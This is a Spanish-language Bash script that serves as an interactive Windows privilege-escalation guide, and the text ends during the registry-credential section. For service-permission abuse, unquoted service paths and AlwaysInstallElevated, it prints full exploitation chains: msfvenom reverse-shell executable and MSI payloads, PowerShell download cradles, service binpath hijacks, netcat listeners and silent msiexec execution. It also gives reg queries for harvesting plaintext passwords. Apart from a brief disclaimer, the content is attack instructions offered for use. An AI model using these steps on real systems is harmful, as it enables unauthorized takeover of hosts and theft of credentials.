#!/bin/bash


#
#This script/tool and its contents are for educational purposes only,
#and to only be applied within a controlled environment for which the 
#necessary permissions have been granted.
#
#Users take full responsibility for any actions performed using this tool.
#
#The author takes no liability for damage caused by this tool.
#If these terms are not acceptable to you, DO NOT USE THIS TOOL.
#
#----------------------------------------------------------------------------
#Esta herramienta y su contenido, es para uso educacional unica y exclusivamente.
#Siendo utilizada en un entorno controlado y sobre el cual se obtiene la autorizacion
#requerida.
#
#Usuarios son completamente responsables de cualquier accion realizada con esta herramienta.
#
#El autor no se hace responsable de cualquier daño causado. Si estos terminos no son acceptables
#para ti, entonces NO UTILICES ESTA HERRAMIENTA.

# Creacion del banner
 echo "*************************************************"
 echo "*                                               *"
 echo "*                WIN PrivEsc                    *"
 echo "*                                               *"
 echo "*                ELEVATE ME                     *"
 echo "*                                               *"
 echo "*                @BY_1AMWH0@                    *"
 echo "*                                               *"
 echo "*************************************************"



#variables  de la opciones, segun input el usuario sera presentado con el procedimiento de cada una
Servicios_Inseguros_debido_a_permisos="1"
Unquoted_Service_Path="2"
AlwaysInstallElevated="3"
Credenciales_Registry="4"
Credenciales_runas="5"
SAM_Security_Account_Manager="6"
PrintSpoofer="7"
Herramientas_Automatizadas="8"


#Menu con las tecninas a enumerar y dependiendo del input explotar o buscar alternativa
echo "------------------------------"
echo " ELIGE LA TECNICA DE ESCALADO "
echo "------------------------------"
echo "1)Servicios_Inseguros_debido_a_permisos"
echo "2)Unquoted_Service_Path"
echo "3)ALwaysInstallElevated"
echo "4)Credenciales_Registry"
echo "5)Credenciales_runas"
echo "6)SAM_Security_Account_Manager"
echo "7)PrintSpoofer"
echo ""
echo "------------------------------"
echo "       OTRAS OPCIONES "
echo "------------------------------"
echo "8)Herramientas_automatizadas"
echo ""
echo ""
echo -n "Indica la tecnica a enumerar (Facilita el numero correspondiente):"
read input

#Si seleccion es 1, se procede a revisar que se tengan los requisitos para ejecutar esta tecnica.
if test $input == $Servicios_Inseguros_debido_a_permisos;then

echo "------------------------------------"
echo "         S-3-R-V-1-C-1-0-5          "
echo "---------------------------1amwh0---"
echo "Los servicios Windows permiten crear programas de larga ejecucion en sesiones propias de Windows"
echo "Es importante tener en cuenta que nuestro usuario puede que tenga permisos para ejecutar programas con privilegios"
echo "de otro usuario, puede que incluso como administrador de este sistema"
echo "///////////////////////////////////////////////////////////////////////////////////////////////////////////////////"
echo ""
echo "------------------------------"
echo "    -R-3-Q-U-1-5-1-T-0-5-     "
echo "------------------------------"
echo ""
echo "> El usuario deber poseer ciertos privilegios / permisos sobre un permiso para poder llevar a cabo esta tecnica"
echo "> Haz uso de la herramienta accesschk para comenzar la enumeracion del usuario y sigue las instrucciones"
echo ""

        read -p "¿Cuenta la máquina comprometida con la herramienta 'accesschk.exe' de Sysinternals? (Si/No/Revisar): " respuesta

        echo ""

        if [ "$respuesta" == "Si" ]; then
        echo "Vamos a realizar una enumeración de permisos con accesschk.exe."
        echo ""
        echo "Para esto debes lanzar el siguiente comando:"
        echo "********************************************"
        echo ""
        echo ""
        echo ">Comando: accesschk.exe /accepteula -uwcqv <nombre_de_usuario> * "
        echo ""
        echo ">Ejemplo: accesschk.exe /accepteula -uwcqv ElBarto *  "
        echo "----------------------------------------------------------"
        echo ""
        echo "Si el output muestra resultados sobre un servicio, es importante ver que el usuario dispone de"
        echo "los siguientes permisos como minimo: SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP, SERVICE_INTERROGATE"
        echo ""
        echo ""
        read -p "Cuenta el usuario con estos permisos sobre algun servicio del sistema?(Si/No): " respuesta1

                if [ "$respuesta1" == "Si" ];then
                echo "Genial, ahora tenemos que revisar si el servicio se ejecuta con un usuario de privilegios elevados como 'LocalSystem'"
                echo ""
                echo "Lanza el siguiente comando: sc qc <nombre_del_servicio>"
                echo ""
                echo "---------------------------"
                echo "| Ejemplo:| sc qc daclsvc |"
                echo "---------------------------------------------------------"
                echo "| Output requerido: NOMBRE_INICIO_SERVICIO: LocalSystem |"
                echo "---------------------------------------------------------"
                echo ""
                        read -p "Se ejecuta el servicio con privilegios elevados?(Si/No): " respuesta2
                        echo ""
                        echo ""

                        if [ "$respuesta2" == "Si" ];then
                        echo ""
                        echo "-------------------------------------------"
                        echo "|                                         |"
                        echo "|         PROCESO DE EJECUCION            |"
                        echo "|                  &                      |"
                        echo "|             EXPLOTACION                 |"
                        echo "|                                         |"
                        echo "-------------------------------------------"
                        echo ""
                        echo "1> Genera una reverse shell con msfvenom en tu Kali"
                        echo " > msfvenom -p windows/x64/reverse_shell_tcp LHOST=tu_ip LPORT=puerto_para_Netcat -f exe -o nombre_del_archivo.exe"
                        echo " > Ejemplo: msfvenom -p windows/x64/reverse_shell_tcp LHOST=10.0.2.10 LPORT=4747 -f exe -o malicioso.exe"
                        echo " >"
                        echo " > ##############################################################################################################"
                        echo " > # Ten en cuenta que dependiendo de la arquitectura puede que requieras de otro payload, consulta en msfvenom #"
                        echo " > # msfvenom -l payloads | grep windows                                                                        #"
                        echo " > ##############################################################################################################"
                        echo " >"
                        echo " > En el directorio donde se encuentra la reverse shell levanta un servidor http con python"
                        echo " >"
                        echo " > python3 -m http.server 8000"
                        echo " >"
                        echo " >"
                        echo "2> Desde la terminal con acceso a la maquina comprometida o en una cmd dentro de la maquina comprometida,"
                        echo " > sube tu reverse shell"
                        echo " >"
                        echo " > Utiliza uno de los siguientes comandos"
                        echo " >------------------------------"
                        echo " >         COMANDOS             "
                        echo " >______________________________"
                        echo " >******************************************************************************************************"
                        echo " > powershell -c wget \"http://tu_ip:8000/nombre_del_archivo.exe\" -outfile \"nombre_del_archivo.exe\" |"
                        echo " >*****************************************************************************************************************************"
                        echo " > powershell \"(New-Object System.Net.WebClient).Downloadfile('http://tu_ip:8000/nombre_archivo.exe','nombre_archivo.exe')\" |"
                        echo " >*****************************************************************************************************************************"
                        echo " >"
                        echo " >"
                        echo "3> Cambia la ruta del binario del servicio legitimo por tu reverse shell en la maquina victima"
                        echo " >"
                        echo " > sc config nombre_del_servicio binpath= \"\\\"C:\\Ruta\\de\\la\\reverse_shell\\\"\" "
                        echo " >"
                        echo " > -------------------------------------------------------------------------"
                        echo " >   Ejemplo:sc config daclsvc \"\\\"C:\\Ruta\\de\\la\\reverse_shell\\\"\" |"
                        echo " > -------------------------------------------------------------------------"
                        echo " >"
                        echo " >"
                        echo "4> En tu Kali levanta un listener con Net Cat para recibir la sesion remota:"
                        echo " >"
                        echo " > nc -lvnp puerto_especificado_en_msfvenom"
                        echo " >"
                        echo " > Ejemplo: nc -lvnp 4747"
                        echo " >"
                        echo " >"
                        echo "5> Arranca el servicio vulnerable, esto deberia de devolverte una sesion remota en tu listener de Net Cat"
                        echo " >"
                        echo " > net start nombre_del_servicio"
                        echo " >"
                        echo " > Ejemplo: net start daclsvc"
                        echo ""
                        echo "*******************************************************************************************************************"
                        echo "*                                                                                                                 *"
                        echo "*                               ESPERO HABERTE SIDO DE AYUDA!!!!                                                  *"
                        echo "*                                                                                                                 *"
                        echo "*******************************************************************************************************************"


                           :
                        elif [ "$respuesta2" == "No" ];then
			echo "***"
                        echo "Prueba otra tecnica, por aqui no parece que puedas seguir"
			echo "***"
                                echo""
                                echo""
                                read -p "Volvemos al menu principal?(Si/No): " respuesta3
                                        if [ "$respuesta3" == "Si"];then
                                        echo "***D0NT-G1V3_UP***"
                                        ./3L3VAT3_M3.sh
                                           :
                                        elif [ "$respuesta3" == "No" ];then
                                        echo "***TRY-HARD3R***"
                                           :
                                        else
                                        echo "***"
                        		echo "Por favor facilita un input valido"
                        		echo "***"
                                        ./3L3VAT3_M3.sh

                                        fi
                           :
                        else
			echo "***"
                        echo "Por favor facilita un input valido"
                        echo "***"
                        ./3L3VAT3_M3.sh


                        fi
                   :
                elif [ "$respuesta1" == "No" ];then
		echo "***"
                echo "Por aqui no parece que puedas continuar, prueba otra tecnica"
		echo "***"
                echo ""
                read -p "Te gustaria empezar de nuevo? (Si/No): " respuesta11
                        echo ""
                        if [ "$respuesta11" == "Si" ];then
                        echo ""
                        echo "***D0NT-G1V3_UP***"
                        ./3L3VAT3_M3.sh
                           :
                        elif [ "$respuesta11" == "No" ];then
                        echo ""
                        echo "***TRY-HARD3R***"
                           :
                        else
			echo "***"
                        echo "Por favor facilita un input valido"
			echo "***"
			./3L3VAT3_M3.sh

                        fi

                   :
                else
                echo "***"
                echo "Por favor facilita un input valido"
                echo "***"
                ./3L3VAT3_M3.sh


                fi

        elif [ "$respuesta" == "No" ]; then
        echo ""
        echo "Descarga la herramienta y guardala en un directorio donde tengas permisos de escritura, comun > C:\Windows\Temp "
        echo ""
        echo "Link: https://learn.microsoft.com/es-es/sysinternals/downloads/accesschk"
        echo ""
        echo "Una vez la tengas en tu equipo, recomiendo pasarla a la maquina comprometida de esta forma:"
        echo "-------------------------"
        echo "|   En tu Kali/Maquina  |"
        echo "-------------------------"
        echo ""
        echo "> Levanta un servidor http con Python, asegurate de estar en el directorio donde se encuentra la herramienta"
        echo ""
        echo "> Comando: python3 -m http.server 8000"
        echo ""
        echo "-------------------------"
        echo "| En la maquina Windows |"
        echo "-------------------------"
        echo "> Copia el ejecutable via powershell, asegurate de estar en un directorio donde tengas permisos de escritura"
        echo ""
        echo "> powershell -c wget 'http://ip_de_kali:8000/accesschk.exe' -outfile 'accesschk.exe'"
        echo ""
        echo "> Si se ha subido el ejecutable correctamente, estas list@ para continuar"
        echo ""
                read -p "Comenzamos de nuevo?(Si/No): " comenzamos
                if [ "$comenzamos" == "Si" ];then
                echo ""
                echo "***D0NT-G1V3_UP***"
                ./3L3VAT3_M3.sh
                   :
                elif [ "$comenzamos" == "No" ];then
                echo ""
                echo "***TRY-HARD3R***"
                   :
                else
                echo ""
                echo "***"
                echo "Por favor facilita un input valido"
                echo "***"
                ./3L3VAT3_M3.sh

                fi
           :
        elif [ "$respuesta" == "Revisar" ];then
        echo ""
        echo "Prueba con 'where accesschk.exe'"
        echo ""
        ./3L3VAT3_M3.sh
           :
        else
	echo "***"
        echo "Respuesta no valida. Porfavor, responda 'Si','No' o 'Revisar'."
	echo "***"
	./3L3VAT3_M3.sh

        fi
fi


#Unquoted_Service_Path
if test $input == $Unquoted_Service_Path;then

echo ""
echo "-----------------------------------------1amwh0-"
echo "_____________Unquoted_Service_Path______________"
echo "         Mr.admin perdio sus comillas           "
echo ""

echo "Durante la fase de explotacion y enumeracion de posibles vectores de ataque, puede que demos con servicios en los cuales su ruta no esta citada entre comillas"
echo "Si encontramos un servicio con esta condicion, y el nombre del ejecutable o algunos de los directorios donde se ubica contienen un espacio, podemos intentar"
echo "modificar la ruta para colocar una reverse shell, arrancar el servicio y obtener una conexion remota con privilegios elevados."

echo "------------------------------"
echo "    -R-3-Q-U-1-5-1-T-0-5-     "
echo "------------------------------"
echo ""
echo ">Durante esta guia, te ayudare a revisar si el usuario dispone de los permisos/privilegios correspondientes"
echo ">"
echo ">El usuario debe tener privilegios de escritura/edicion sobre la ruta del servicio vulnerable"
echo ">El usuario debe de poder iniciar el servicio vulnerable"
echo ""
        read -p "Comenzamos a enumerar posbiles rutas de servicio vulnerbales?(Si/No) :" respuesta
        if [ "$respuesta" == "Si" ];then
        echo ""
        echo "Usa el siguiente comando en tu terminal con acceso a la maquina comprometida o cmd de tu sesion RDP"
        echo ""
        echo "> wmic service get name,displayname,pathname,startmode ^| findstr /i /v \"C:\\Windows\\\" ^| findstr /i /v \"\"\""
        echo ""
        echo ""
        echo "Si tienes algo parecido al siguiente ejemplo entonces parece que puedes seguir por este camino"
        echo "---------------"
        echo "|3-J-3-M-P-L-O|"
        echo "---------------"
        echo ""
        echo "> C:\Program FIles\Unquoted Path Service\Common FIles\unquotedpathservice.exe"
        echo ""

                read -p "Has encontrado un servicio con su ruta no citada entre comillas(Si/No): " respuesta1
                if [ "$respuesta1" == "Si" ];then
                echo ""
                echo "Parece que la fuerza te acompana..... o no jejeje"
                echo ""
                echo "Ahora debemos revisar los privilegios del usuario sobre el servicio detectado para saber si podemos continuar por esta ruta o no"
                echo "Para esto haremos uso de la herramienta accesschk"
                        echo ""
                        read -p "¿Cuenta la máquina comprometida con la herramienta 'accesschk.exe' de Sysinternals? (Si/No/Revisar): " respuesta2
                        echo""
                        if [ "$respuesta2" == "Si" ];then
                        echo ""
                        echo "Se requiere que el usuario disponga de estos privilegios como minimo"
                        echo "---------------------------------------------------------------------"
                        echo ""
                        echo "> SERVICE_QUERY_CHANGE_CONFIG"
                        echo "> SERVICE_START"
                        echo "> SERVICE_STOP"
                        echo ""
                        echo " > Revisa los permisos sobre la ruta del servicio"
                        echo " > accesschk.exe /accepteula -uwqdv nombre_usuario \"C:\\\\Program Files\\\\Unquoted Path Service\\\\\""
                        echo " > accesschk.exe /accepteula -uwqdv ElBarto  \"C:\\\\Program Files\\\\Unquoted Path Service\\\\\""

                                read -p "Dispone el usuario de estos privilegios sobre el servicio detectado?(Si/No): " respuesta3
                                if [ "$respuesta3" == "Si" ];then
                                echo ""
                                echo " > Revisa los permisos de ejecucion sobre la ruta del servicio"
                                echo " El ultimo paso seria revisar si el servicio vulnerable se ejecuta con privilegios elevados"
                                echo " Ejecuta el siguiente comando"
                                echo ""
                                echo "> sc query nombre_del_servicio"
                                echo "> Ejemplo: sc query unquotedsvc"
                                echo ""
                                echo " Tras ejecutar el comando anterior, deberias tener un output como este "
                                echo " NOMBRE_INICIO_SERVICIO: LocalSystem . Puede que la maquina tenga otro usuario con permisos de admin, por lo que tambien valdria"
                                        echo ""
                                        read -p "Se ejecuta el servicio vulnerable con privilegios elevados?(Si/No) :" respuesta4
                                        if [ "$respuesta4" == "Si" ]; then
                                        echo " A POR ADMIN!!! "
                                        echo "-------------------------------------------"
                                        echo "|                                         |"
                                        echo "|         PROCESO DE EJECUCION            |"
                                        echo "|                  &                      |"
                                        echo "|             EXPLOTACION                 |"
                                        echo "|                                         |"
                                        echo "-------------------------------------------"
                                        echo "///////////////////////////////////////////"
                                        echo "1> Genera una reverse shell con msfvenom en tu Kali"
                                        echo " > msfvenom -p windows/x64/reverse_shell_tcp LHOST=tu_ip LPORT=puerto_para_Netcat -f exe -o nombre_del_archivo.exe"
                                        echo " > Ejemplo: msfvenom -p windows/x64/reverse_shell_tcp LHOST=10.0.2.10 LPORT=4747 -f exe -o malicioso.exe"
                                        echo " >"
                                        echo " > #############################################################################################################"
                                        echo " > # Ten en cuenta que dependiendo de la arquitectura puede que requieras de otro payload, consulta en msfvenom#"
                                        echo " > # msfvenom -l payloads | grep windows                                                                       #"
                                        echo " > #############################################################################################################"
                                        echo " >"
                                        echo " > ###########################################################################################################################################"
                                        echo " > # Ten en cuenta que te interesa nombrar tu reverse shell similar al directorio que vamos a modificar como se muestra en el ejemplo abajo  #"
                                        echo " > ###########################################################################################################################################"
                                        echo " >"
                                        echo " > En el directorio donde se encuentra la reverse shell levanta un servidor http con python"
                                        echo " >"
                                        echo " > python3 -m http.server 8000"
                                        echo " >"
                                        echo " >"
                                        echo "2> Desde la terminal con acceso a la maquina comprometida o en una cmd dentro de la maquina comprometida,"
                                        echo " > sube tu reverse shell"
                                        echo " >"
                                        echo " > Utiliza uno de los siguientes comandos"
                                        echo " >------------------------------"
                                        echo " >         COMANDOS             "
                                        echo " >______________________________"
                                        echo " >******************************************************************************************************"
                                        echo " > powershell -c wget \"http://tu_ip:8000/nombre_del_archivo.exe\" -outfile \"nombre_del_archivo.exe\"  "
                                        echo " >*****************************************************************************************************************************"
                                        echo " > powershell \"(New-Object System.Net.WebClient).Downloadfile('http://tu_ip:8000/nombre_archivo.exe','nombre_archivo.exe')\" "
                                        echo " >*****************************************************************************************************************************"
                                        echo " >"
                                        echo " >"
                                        echo "3> Coloca tu reverse shell en la maquina victima (en un directorio donde puedas escribir!), renombrando la ruta del servicio vulnerable. Aqui lo que estamos haciendo es enganar al sistema,"
                                        echo " > haciendole creer que el binario legitimo se encuentra en la ruta modificada, ejecuntando nuestra reverse shell antes de llegar al .exe legitimo"
                                        echo " >"
                                        echo " > copy nombre_shell.exe \"C:\\Ruta\\Vulnerable\\malicioso.exe\""
                                        echo " >"
                                        echo " > -------------------------------------------------------------------------------------------------"
                                        echo " >   Ejemplo de Path: C:\\Program Files\\Unquoted Path Service\\Common Files\\unquoatedservice.exe |"
                                        echo " > -------------------------------------------------------------------------------------------------"
                                        echo " >   Nombre de la reverse shell: Common.exe, ya que reemplaza \\Common Files\\                     |"
                                        echo " > -------------------------------------------------------------------------------------------------"
                                        echo " >   Modificacion: copy Common.exe C:\\Program Files\\Unquoted Path Service\\Common.exe            |"
                                        echo " > -------------------------------------------------------------------------------------------------"
                                        echo " >"
                                        echo "4> En tu Kali levanta un listener con Net Cat para recibir la sesion remota:"
                                        echo " >"
                                        echo " > nc -lvnp puerto_especificado_en_msfvenom"
                                        echo " >"
                                        echo " > Ejemplo: nc -lvnp 4747"
                                        echo " >"
                                        echo " >"
                                        echo "5> Arranca el servicio vulnerable, esto deberia de devolverte una sesion remota en tu listener de Net Cat"
                                        echo " >"
                                        echo " > net start nombre_servicio"
                                        echo " >"
                                        echo " > Ejemplo: net start unquoatedsvc"
                                        echo ""
                                        echo "*******************************************************************************************************************"
                                        echo "*                                                                                                                 *"
                                        echo "*                              ESPERO HABERTE SIDO DE AYUDA!!!!                                                   *"
                                        echo "*                                                                                                                 *"
                                        echo "*******************************************************************************************************************"


                                           :
                                        elif [ "$respuesta4" == "No" ]; then
                                        echo ""
                                        echo "Por aqui no parece que puedas continuar, prueba otra tecnica"
                                        echo ""
                                                read -p "Probamos con otra tecnica?(Si/No): " vuelta0
                                                if [ "$vuelta" == "Si" ];then
                                                echo ""
                                                echo "***D0NT-G1V3_UP***"
                                                ./3L3VAT3_M3.sh
                                                   :
                                                elif [ "$vuelta0" == "No" ];then
                                                echo ""
                                                echo "***TRY-HARD3R***"
                                                   :
                                                else
                                                echo ""
						echo "***"
                                                echo "Por favor facilita un input valido"
						echo "***"
                                                ./3L3VAT3_M3.sh

                                                fi
                                           :
                                        else
                                        echo ""
                                        echo "***"
                                        echo "Por favor facilita un input valido"
                                        echo "***"
                                        ./3L3VAT3_M3.sh

                                        fi

                                   :
                                elif [ "$respuesta3" == "No" ];then
                                echo ""
                                echo "Por aqui no parece que puedas continuar, prueba otra tecnica"
                                echo ""
                                        read -p "Probamos con otra tecnica?(Si/No): " vuelta
                                        if [ "$vuelta" == "Si" ];then
                                        echo ""
                                        echo "***D0NT-G1V3_UP***"
                                        ./3L3VAT3_M3.sh
                                           :
                                        elif [ "$vuelta" == "No" ];then
                                        echo ""
                                        echo "***TRY-HARD3R***"
                                           :
                                        else
                                        echo ""
					echo "***"
                                        echo "Por favor facilita un input valido"
                                        echo "***"
					./3L3VAT3_M3.sh


                                        fi
                                   :
                                else
				echo "***"
                                echo "Por favor facilita un input valido"
                                echo "***"
				./3L3VAT3_M3.sh


                                fi

                           :
                        elif [ "$respuesta2" == "No" ];then
                        echo""
                        echo "Descarga la herramienta y guardala en un directorio donde tengas permisos de escritura, comun > C:\Windows\Temp "
                        echo ""
                        echo "Link: https://learn.microsoft.com/es-es/sysinternals/downloads/accesschk"
                        echo ""
                        echo "Una vez la tengas en tu equipo, recomiendo pasarla a la maquina comprometida de esta forma:"
                        echo "-------------------------"
                        echo "|   En tu Kali/Maquina  |"
                        echo "-------------------------"
                        echo ""
                        echo "> Levanta un servidor http con Python, asegurate de estar en el directorio donde se encuentra la herramienta"
                        echo ""
                        echo "> Comando: python3 -m http.server 8000"
                        echo ""
                        echo "-------------------------"
                        echo "| En la maquina Windows |"
                        echo "-------------------------"
                        echo "> Copia el ejecutable via powershell, asegurate de estar en un directorio donde tengas permisos de escritura"
                        echo ""
                        echo "> powershell -c wget 'http://ip_de_kali:8000/accesschk.exe' -outfile 'accesschk.exe'"
                        echo ""
                        echo "> Si se ha subido el ejecutable correctamente, estas list@ para continuar"
                        echo ""
                        echo "Empieza de 0, desde el menu principal... sorry jeje"
                        echo "***"
			./3L3VAT3_M3.sh

                           :
                        else
                        echo ""
			echo "***"
                        echo "Por favor facilita un input valido"
                        echo "***"
			./3L3VAT3_M3.sh


                        fi

                   :
                elif [ "$respuesta1" == "No" ];then
                echo "Por aqui no parece que puedas continuar, prueba otra tecnica"
                echo ""
                        read -p "Probamos con otra tecnica?(Si/No): " vuelta1
                        if [ "$vuelta1" == "Si" ];then
                        echo ""
                        echo "***D0NT-G1V3_UP***"
                        ./3L3VAT3_M3.sh

                           :
                        elif [ "$vuelta1" == "No" ];then
                        echo ""
                        echo "***TRY-HARD3R***"
                           :
                        else
                        echo ""
			echo "***"
                        echo "Por favor facilita un input valido"
			echo "***"
                        ./3L3VAT3_M3.sh

                        fi
                   :
                else
                echo ""
                echo "***"
                echo "Por favor facilita un input valido"
                echo "***"
                ./3L3VAT3_M3.sh

                fi
           :
        elif [ "$respuesta" == "No" ];then
        echo ""
                read -p "Mmmmm... prefieres usar otra tecnica(Si/No): " vuelta2
                if [ "$vuelta2" == "Si" ];then
                echo ""
                echo "***D0NT-G1V3_UP***"
                ./3L3VAT3_M3.sh
                   :
                elif [ "$vuelta2" == "No" ];then
                echo ""
                echo "***TRY-HARD3R***"
                   :
                else
                echo ""
                echo "***"
                echo "Por favor facilita un input valido"
                echo "***"
                ./3L3VAT3_M3.sh

                fi
           :
        else
        echo ""
	echo "***"
        echo "Por favor facilita un input valido"
        echo "***"
        ./3L3VAT3_M3.sh
           :
        fi
fi


#Alwaysinstallelevated

if test $input == $AlwaysInstallElevated;then

echo "*****************************1amwh0*"
echo "*----A-L-W-A-Y-5                   *"
echo "*              -3-L-3-V-A-T-3-D----*"
echo "************************************"
echo ""
echo ""
echo "Los sistemas operativos Windows, cuentan con una directiva local la cual indica si los paquetes de Microsoft deben instalarse siempre con los maximos privilegios."
echo "Si enumerando el host vemos que esta directiva se encuentra activa, tenemos un posible vector de ataque"
echo ""
echo "Una manera sencilla de revisar si la directiva se encuentra activa, es enumerando el registro. En las siguientes rutas"
echo ""
echo ">Rutas"
echo "********************************************************************************"
echo "*  HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated  *"
echo "*------------------------------------------------------------------------------*"
echo "*  HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated  *"
echo "********************************************************************************"
echo ""
echo ""
echo "> Ejecuta el siguiente comando en la maquina comprometida, para enumerar la clave del registro HKCU"
echo "> esto revisara HKEY_CURRENT_USER"
echo ""
echo "> reg query HKCU\Software\Policies\Microsoft\Windows\Installer\ /v AlwaysInstallElevated"
echo ""
echo "> En el output deberias de ver lo siguiente, indicando que la directiva se encuentra activa"
echo ">"
echo "> REG_DWORD 0x1 "
echo""

	read -p "Tras lanzar el comando, se observa el output mencionado?(Si/No): " comenzar
	if [ "$comenzar" == "Si" ];then
	echo ""
	echo "___Parece que esto va a ser rapdio_____"
	echo ""
		read -p "Quieres que te facilite el procedimiento de explotacion?(Si/No): " respuesta5
		if [ "$respuesta5" == "Si" ];then
		echo ""
                echo " A POR ADMIN!!! "
                echo "-------------------------------------------"
                echo "|                                         |"
                echo "|         PROCESO DE EJECUCION            |"
                echo "|                  &                      |"
                echo "|             EXPLOTACION                 |"
                echo "|                                         |"
                echo "-------------------------------------------"
                echo ""
                echo "1> Genera una reverse shell con msfvenom en tu Kali con formato msi (microsoft installer packet)"
                echo " >"
                echo " > msfvenom -p /windows/64/reverse_shell_tcp LHOST=tu_ip LPORT=puerto_netcat -f msi > nombre_archvio.msi "
                echo " >"
                echo " > Ejemplo:"
                echo " > msfvenom -p /windows/64/reverse_shell_tcp LHOST=10.0.1.1 LPORT=4949 -f msi > elevateme.msi"
                echo " >"
                echo " > ##############################################################################################################"
                echo " > # Ten en cuenta que dependiendo de la arquitectura puede que requieras de otro payload, consulta en msfvenom #"
                echo " > # msfvenom -l payloads | grep windows                                                                        #"
                echo " > ##############################################################################################################"
                echo " >"
                echo " >"
                echo " > En el directorio donde se encuentra la reverse shell levanta un servidor http con python"
                echo " >"
                echo " > python3 -m http.server 8000"
                echo " >"
                echo " >"
                echo "2> Desde la terminal con acceso a la maquina comprometida o en una cmd dentro de la maquina comprometida,"
                echo " > sube tu reverse shell (en un directorio donde puedas escribir!),"
                echo " >"
                echo " > Utiliza uno de los siguientes comandos"
                echo " >------------------------------"
                echo " >         COMANDOS             "
                echo " >______________________________"
                echo " >*****************************************************************************************************************************"
                echo " > powershell -c wget \"http://tu_ip:8000/nombre_del_archivo.exe\" -outfile \"nombre_del_archivo.exe\"                        |"
                echo " >- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
                echo " > powershell \"(New-Object System.Net.WebClient).Downloadfile('http://tu_ip:8000/nombre_archivo.exe','nombre_archivo.exe')\" |"
                echo " >*****************************************************************************************************************************"
                echo " >"
                echo " > Confirma que el upload se ha realizado correctamente listando el directorio en el que has metido la reverse shell y verifica que esta"
                echo " >"
                echo "3> Levanta un listener de netcat en tu cali escuchando en el puerto especificado duranta la creacion de la reverse shell:"
                echo " >"
                echo " > nc -lvnp puerto_especificado_en_msfvenom"
                echo " >"
                echo " > Ejemplo: nc -lvnp 4949"
                echo " >"
                echo " >"
                echo "4> Ya solo queda ejecutar el siguiente comando en la maquina comprometida, tras su ejecucion deberias de tener una conexion remota"
                echo " > como SYSTME/NT AUTHORITY o usuario con privilegios elevados"
                echo " >"
                echo " > msiexec /quiet /qn /i nombre_reverse_shell.msi"
                echo " >"
                echo " > Ejemplo: msiexec /quiet /qn /i elevateme.msi"
                echo " >"
                echo " >"
                echo " > Si has seguido los pasos correctamente, deberias de haber conseguido escalar privilegios!"
                echo "*******************************************************************************************************************"
                echo "*                                                                                                                 *"
                echo "*                              ESPERO HABERTE SIDO DE AYUDA!!!!                                                   *"
                echo "*                                                                                                                 *"
                echo "*******************************************************************************************************************"
		   :
		elif [ "$respuesta5" == "No" ];then
		echo""
		echo " ESPERO HABERTE SIDO DE AYUDA!!!! "
		echo "     ***D0NT-G1V3_UP*** "
		   :
		else
		echo ""
		echo "***"
		echo "Porfavor facilita un input valido"
		echo "***"
		./3L3VAT3_M3.sh

		fi

	   :
	elif [ "$comenzar" == "No" ];then
	echo ""
	echo "---Mmmmm... Parece que por aqui no puedes continuar---"
	echo "***"
	echo "---Prueba con otra tecnica de escalado---"
	echo "***"
	./3L3VAT3_M3.sh
	   :
	else
	echo ""
	echo "***"
	echo "Por favor facilita un input valido"
	echo "***"
	./3L3VAT3_M3.sh

	fi

fi

if test $input == $Credenciales_Registry;then

echo ""
echo "----------------0==r------------------"
echo "--P-A-5-5-W-0-R-D-5"
echo "           ---1-N---T-H-3- "
echo "                  ---R-3-G-1-5-T-R-Y"
echo "1amwh0----------0==r------------------"
echo ""
echo ""
echo ">Es posible que el proceso de escalada de privilegios se puede acortar si damos con credenciales almacenadas o disponibles en el sistema"
echo ">En esta tecnica se procede a buscar las credenciales almacenadas en la clave de registro HKCU (HKEY_CURRENT_USER) y HKLM (HKEY_LOCAL_MACHINE)"
echo ">"
echo ">Esta herramienta ofrece dos metodos"
echo ">"
echo "> Metodo 1 [RECOMENDADO],  realiza una busqueda en le registro de winlogon, suele ser un sitio comun para almacenar credenciales debido a su funcion"
echo "> Metodo 2 buscara en todo el registro HKCU la palabra 'password' "
echo ""
	read -p "Selecciona un metodo(1/2): " metodo
	if [ "$metodo" == "1" ];then
	echo ""
	echo "-----M-3-T-0-D-0-1-----"
	echo ">"
	echo "> Comando:"
	echo '> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"'
	echo ">"
	echo "> Tras ejecutar este comando, si disponibles, se veran credenciales en texto plano al final del output"
	echo ">"
	echo "***"
	echo "------ESPERO HABER SIDO DE AYUDA!!-------"
	echo "***"
		read -p "Si este metodo no ha funcionado, quieres probar otra tecnica? Recuerda que tienes el metodo 2.(Si/No/2): " metodo1
		if [ "$metodo1" == "Si" ];then
		echo "***"
		echo "---------Volvamos a empezar----------"
		echo "***"
		./3L3VAT3_M3.sh
		   :
		elif [ "$metodo1" == "No" ];then
		echo ""
                echo " ESPERO HABERTE SIDO DE AYUDA!!!! "
                echo "     ***D0NT-G1V3_UP*** "
                   :
		elif [ "$metodo1" == "2" ];then
		echo "-----M-3-T-0-D-0-2-----"
        	echo ">"
        	echo "> Los siguientes comandos daran un output muy grande por lo que puede resultar dificil encontrar lo que buscas,"
        	echo "> pero...... a quien no le gustan los retos"
        	echo ">"
        	echo "> Comandos:"
        	echo "> Enumerar HKCU: reg query /f password /t REG_Z /s"
        	echo ">"
        	echo "> Enumerar HKLM: reg query /t REG_SZ /s"
        	echo ">"
        	echo "> Tras ejecutar el comando, si disponibles, se veran credenciales en texto plano en el output"
        	echo ">"
        	echo "***"
        	echo "------ESPERO HABER SIDO DE AYUDA!!-------"
        	echo "***"
			read -p "Si no has encontrado nada quieres probar otra tecnica(Si/No): " vuelta5
                	if [ "$vuelta5" == "Si" ];then
                	echo ""
                	echo "***D0NT-G1V3_UP***"
                	./3L3VAT3_M3.sh
                   	   :
                	elif [ "$vuelta5" == "No" ];then
                	echo ""
                	echo "***TRY-HARD3R***"
                           :
                	else
                	echo ""
			echo "***"
                	echo "Por favor facilita un input valido"
                	echo "***"
			./3L3VAT3_M3.sh

                	fi
		   :
                else
                echo ""
		echo "***"
                echo "Porfavor facilita un input valido"
		echo "***"
                ./3L3VAT3_M3.sh

                fi
	   :
	elif [ "$metodo" == "2" ];then
	echo ""
	echo "-----M-3-T-0-D-0-2-----"
        echo ">"
	echo "> Los siguientes comandos daran un output muy grande por lo que puede resultar dificil encontrar lo que buscas,"
	echo "> pero...... a quien no le gustan los retos"
	echo ">"
